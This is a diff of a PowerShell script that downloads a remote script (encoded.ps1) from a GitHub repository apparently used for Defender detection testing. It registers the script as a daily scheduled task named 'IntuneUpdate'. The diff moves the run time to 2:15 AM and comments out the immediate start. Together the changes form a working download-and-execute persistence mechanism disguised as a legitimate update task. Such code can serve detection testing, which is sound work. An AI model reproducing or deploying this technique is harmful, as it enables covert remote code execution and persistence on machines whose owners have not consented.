@@ -1,4 +1,4 @@
-$payloadText = 'https://raw.githubusercontent.com/FuzzyKittens/MDETest/main/notepad.ps1'
+$payloadText = 'https://raw.githubusercontent.com/FuzzyKittens/MDETest/main/encoded.ps1'
 $payload = ((New-Object System.Net.WebClient).DownloadString($payloadText))
 
 $taskName = 'IntuneUpdate'
@@ -10,10 +10,10 @@ if ($taskExists) {
     }
 
 $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument $taskArgument
-$trigger = New-ScheduledTaskTrigger -Daily -At "9:00 AM"
+$trigger = New-ScheduledTaskTrigger -Daily -At "2:15 AM"
 
 $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
 
 $null = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $taskSettings
 
-Start-ScheduledTask -TaskName $taskName
+#Start-ScheduledTask -TaskName $taskName
